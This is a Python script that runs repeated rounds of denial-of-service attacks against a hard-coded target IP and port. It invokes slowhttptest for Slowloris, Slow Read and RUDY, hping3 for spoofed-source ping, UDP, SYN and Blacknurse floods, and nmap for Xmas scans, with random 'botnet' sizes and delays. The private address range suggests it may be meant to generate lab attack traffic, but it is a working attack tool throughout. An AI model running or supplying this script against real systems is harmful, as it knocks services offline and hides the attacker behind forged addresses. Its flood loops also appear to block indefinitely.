
import os
import time
import random
import ipaddress

# Target Machine
VICTIM_IP = "192.168.1.100"  # Set target IP
VICTIM_PORT = 80  # Set target port

# Define botnet size range 
BOTNET_SIZE_RANGE = [50, 171, 233, 340, 500]  # Adjust for some randomeness in botnet size

# Function to generate a list of spoofed botnet IPs
def generate_botnet_ips(start_ip, botnet_size):
    return [str(ipaddress.ip_address(start_ip) + x) for x in range(botnet_size)]

# Attack functions
def slow_read(botnet_size):
    os.system(f"slowhttptest -B -c {botnet_size} -X -g -r 5 -l 300 -u http://{VICTIM_IP}:{VICTIM_PORT}")

def rudy(botnet_size):
    os.system(f"slowhttptest -R -c {botnet_size} -H -u http://{VICTIM_IP}:{VICTIM_PORT} -l 300")

def ping_flood(botnet_size):
    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
        os.system(f"hping3 -1 --flood --spoof {ip} {VICTIM_IP}")

def blacknurse(botnet_size, short=False):
    duration = 30 if short else 120
    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
        os.system(f"hping3 --icmp --icmptype 3 --icmpcode 3 -d 1400 -i u1 -c {duration} --spoof {ip} {VICTIM_IP}")

def xmas_scan(botnet_size):
    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
        os.system(f"nmap -sX -S {ip} {VICTIM_IP}")

def udp_flood(botnet_size):
    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
        os.system(f"hping3 --udp --flood --rand-source --spoof {ip} {VICTIM_IP}")

def syn_flood(botnet_size):
    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
        os.system(f"hping3 -S --flood --rand-source -p {VICTIM_PORT} --spoof {ip} {VICTIM_IP}")

def slowloris(botnet_size):
    os.system(f"slowhttptest -c {botnet_size} -H -g -o slowloris_test -u http://{VICTIM_IP}:{VICTIM_PORT} -r 50 -l 300")

# Execution schedule with random botnet sizes
ATTACKS = [
    ("Slow Read", slow_read),
    ("RUDY", rudy),
    ("Ping Flood", ping_flood),
    ("Blacknurse (Short)", lambda botnet_size: blacknurse(botnet_size, short=True)),
    ("Blacknurse", blacknurse),
    ("Xmas Scan", xmas_scan),
    ("UDP Flood", udp_flood),
    ("SYN Flood", syn_flood),
    ("Slowloris", slowloris)
]

# Run each attack 4 times with different botnet sizes
for i in range(4):
    print(f"--- Starting Attack Round {i+1} ---")
    for name, attack in ATTACKS:
        botnet_size = random.choice(BOTNET_SIZE_RANGE)  # Randomize botnet size
        print(f"Executing {name} with botnet size {botnet_size}...")
        attack(botnet_size)
        time.sleep(random.randint(30, 90))  # Random delay between attacks

print("All attacks executed.")
